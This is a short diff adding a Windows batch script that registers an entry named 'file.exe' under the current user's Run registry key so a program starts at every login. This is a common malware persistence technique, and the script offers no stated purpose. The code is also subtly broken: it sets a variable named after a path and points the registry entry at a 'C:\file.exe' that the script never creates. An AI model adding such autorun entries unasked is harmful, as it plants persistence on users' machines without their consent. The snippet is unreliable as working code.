@@ -1,0 +1,8 @@
+@echo off
+
+:: Get the current script path and name
+set C:\file.exe=%~dp0
+set file.exe=%~n0.bat
+
+:: Add the script to the Windows startup
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "file.exe" /t REG_SZ /d "C:\file.exe" /f
